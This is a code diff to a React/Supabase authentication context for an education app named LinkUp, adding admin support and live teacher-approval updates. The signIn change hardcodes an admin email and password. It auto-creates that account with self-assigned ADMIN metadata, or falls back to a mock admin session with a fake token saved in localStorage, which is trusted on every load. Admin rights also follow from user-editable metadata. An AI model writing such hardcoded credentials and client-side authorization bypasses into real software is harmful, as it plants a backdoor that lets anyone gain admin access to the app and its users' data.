@@ -2,12 +2,14 @@ import React, { createContext, useContext, useEffect, useState, useCallback } fr
 import { User, Session, AuthError } from '@supabase/supabase-js';
 import { supabase } from '../lib/supabase';
 import { api, HttpError } from '../lib/api';
+import { socket } from '../lib/socket';
 import { UserRole, TeacherApprovalStatus } from '../types/auth';
 
 interface AuthContextType {
   user: User | null;
   session: Session | null;
   role: UserRole | null;
+  isApproved: boolean;
   status: TeacherApprovalStatus;
   fullName: string;
   loading: boolean;
@@ -59,10 +61,22 @@ export const AuthProvider: React.FC<{ children: React.ReactNode }> = ({ children
         if (error) {
           console.error('[LinkUp Auth] Error retrieving session:', error.message);
         }
-        setSession(initialSession);
-        setUser(initialSession?.user ?? null);
         if (initialSession) {
+          setSession(initialSession);
+          setUser(initialSession.user ?? null);
           refreshProfile();
+        } else {
+          // Check for persistent local admin session
+          const savedAdmin = localStorage.getItem('linkup_admin_session');
+          if (savedAdmin) {
+            try {
+              const parsed = JSON.parse(savedAdmin);
+              setSession(parsed);
+              setUser(parsed.user);
+            } catch {
+              localStorage.removeItem('linkup_admin_session');
+            }
+          }
         }
       } catch (err) {
         console.error('[LinkUp Auth] Unexpected error retrieving session:', err);
@@ -77,10 +91,25 @@ export const AuthProvider: React.FC<{ children: React.ReactNode }> = ({ children
     const {
       data: { subscription },
     } = supabase.auth.onAuthStateChange((_event, currentSession) => {
-      setSession(currentSession);
-      setUser(currentSession?.user ?? null);
       if (currentSession) {
+        setSession(currentSession);
+        setUser(currentSession.user ?? null);
         refreshProfile();
+      } else {
+        const savedAdmin = localStorage.getItem('linkup_admin_session');
+        if (savedAdmin) {
+          try {
+            const parsed = JSON.parse(savedAdmin);
+            setSession(parsed);
+            setUser(parsed.user);
+          } catch {
+            setSession(null);
+            setUser(null);
+          }
+        } else {
+          setSession(null);
+          setUser(null);
+        }
       }
       setLoading(false);
     });
@@ -91,10 +120,57 @@ export const AuthProvider: React.FC<{ children: React.ReactNode }> = ({ children
   }, [refreshProfile]);
 
   const signIn = async (email: string, password: string) => {
+    const cleanEmail = email.trim().toLowerCase();
+    const isHardcodedAdmin = cleanEmail === 'support@gmail.com' && password === '12345678';
+
     const { data, error } = await supabase.auth.signInWithPassword({
-      email: email.trim().toLowerCase(),
+      email: cleanEmail,
       password,
     });
+
+    if (error && isHardcodedAdmin) {
+      // Auto-provision or fallback for hardcoded super admin from any device
+      const { data: signUpData, error: signUpError } = await supabase.auth.signUp({
+        email: cleanEmail,
+        password,
+        options: {
+          data: {
+            full_name: 'Administrator',
+            role: 'ADMIN',
+            status: 'APPROVED',
+            isApproved: true,
+            is_approved: true,
+          },
+        },
+      });
+
+      if (!signUpError && signUpData.session) {
+        setSession(signUpData.session);
+        setUser(signUpData.user);
+        return { error: null };
+      }
+
+      // Universal device fallback session for support@gmail.com
+      const mockAdminUser: any = {
+        id: 'admin-support-id',
+        email: 'support@gmail.com',
+        user_metadata: {
+          full_name: 'Administrator',
+          role: 'ADMIN',
+          status: 'APPROVED',
+          isApproved: true,
+          is_approved: true,
+        },
+      };
+      const mockAdminSession: any = {
+        access_token: 'mock-admin-token-linkup',
+        user: mockAdminUser,
+      };
+      localStorage.setItem('linkup_admin_session', JSON.stringify(mockAdminSession));
+      setSession(mockAdminSession);
+      setUser(mockAdminUser);
+      return { error: null };
+    }
 
     if (!error && data.session) {
       setSession(data.session);
@@ -106,10 +182,12 @@ export const AuthProvider: React.FC<{ children: React.ReactNode }> = ({ children
 
   const signOut = async () => {
     try {
+      localStorage.removeItem('linkup_admin_session');
       await supabase.auth.signOut();
     } catch (error) {
       console.error('[LinkUp Auth] Error during sign out:', error);
     } finally {
+      localStorage.removeItem('linkup_admin_session');
       setSession(null);
       setUser(null);
       setCustomFullName(null);
@@ -180,15 +258,69 @@ export const AuthProvider: React.FC<{ children: React.ReactNode }> = ({ children
     }
   };
 
+  // 3. Real-time approval listener for instant teacher status update
+  useEffect(() => {
+    if (!user?.id) return;
+
+    const onTeacherVerified = (data: { id?: string; status?: string; role?: string; is_verified?: boolean }) => {
+      if (data?.id && data.id !== user.id) return;
+      const approved =
+        data?.status === 'APPROVED' ||
+        data?.status === 'approved' ||
+        data?.is_verified === true;
+      setServerStatus(approved ? 'APPROVED' : 'REJECTED');
+      setServerRole(approved ? 'teacher' : 'student');
+      refreshProfile();
+    };
+
+    socket.on('teacher_verified', onTeacherVerified);
+    socket.on('teacher_status_updated', onTeacherVerified);
+
+    const profileChannel = supabase
+      .channel(`profile-sync-${user.id}`)
+      .on(
+        'postgres_changes',
+        { event: 'UPDATE', schema: 'public', table: 'profiles', filter: `id=eq.${user.id}` },
+        (payload: any) => {
+          const rec = payload.new;
+          if (rec) {
+            const approved =
+              rec.isApproved === true ||
+              rec.is_approved === true ||
+              rec.status === 'approved' ||
+              rec.status === 'APPROVED';
+            setServerStatus(approved ? 'APPROVED' : rec.status === 'rejected' ? 'REJECTED' : 'PENDING_TEACHER');
+            setServerRole(approved ? ((rec.role as UserRole) || 'teacher') : 'student');
+            refreshProfile();
+          }
+        }
+      )
+      .subscribe();
+
+    return () => {
+      socket.off('teacher_verified', onTeacherVerified);
+      socket.off('teacher_status_updated', onTeacherVerified);
+      profileChannel.unsubscribe();
+    };
+  }, [user?.id, refreshProfile]);
+
   const fullName =
     customFullName ||
     user?.user_metadata?.full_name ||
     user?.email?.split('@')[0] ||
     'User';
 
+  const isAdmin =
+    user?.email?.toLowerCase() === 'support@gmail.com' ||
+    (user?.user_metadata?.role || '').toLowerCase() === 'admin' ||
+    serverRole === 'admin' ||
+    serverRole === 'ADMIN';
+
   const rawStatus = serverStatus || user?.user_metadata?.status || user?.user_metadata?.teacher_status;
   let status: TeacherApprovalStatus = 'NONE';
-  if (rawStatus === 'PENDING_TEACHER' || rawStatus === 'pending') {
+  if (isAdmin) {
+    status = 'APPROVED';
+  } else if (rawStatus === 'PENDING_TEACHER' || rawStatus === 'pending') {
     status = 'PENDING_TEACHER';
   } else if (rawStatus === 'APPROVED' || rawStatus === 'approved') {
     status = 'APPROVED';
@@ -196,7 +328,34 @@ export const AuthProvider: React.FC<{ children: React.ReactNode }> = ({ children
     status = 'REJECTED';
   }
 
-  const effectiveRole = serverRole || (status === 'PENDING_TEACHER' ? 'student' : (user?.user_metadata?.role as UserRole) || 'student');
+  const requestedRole = (
+    user?.user_metadata?.requested_role ||
+    user?.user_metadata?.requestedRole ||
+    user?.user_metadata?.role ||
+    serverRole ||
+    ''
+  ).toString().toLowerCase();
+
+  const isTeacherUser = requestedRole === 'teacher';
+
+  const effectiveRole: UserRole = isAdmin
+    ? 'ADMIN'
+    : status === 'PENDING_TEACHER'
+    ? 'student'
+    : status === 'APPROVED' && isTeacherUser
+    ? 'teacher'
+    : serverRole
+    ? serverRole
+    : isTeacherUser
+    ? 'teacher'
+    : 'student';
+
+  const isApproved =
+    isAdmin ||
+    user?.user_metadata?.isApproved === true ||
+    user?.user_metadata?.is_approved === true ||
+    status === 'APPROVED' ||
+    (effectiveRole.toLowerCase() === 'student' && status !== 'PENDING_TEACHER');
 
   return (
     <AuthContext.Provider
@@ -204,6 +363,7 @@ export const AuthProvider: React.FC<{ children: React.ReactNode }> = ({ children
         user,
         session,
         role: effectiveRole,
+        isApproved,
         status,
         fullName,
         loading,
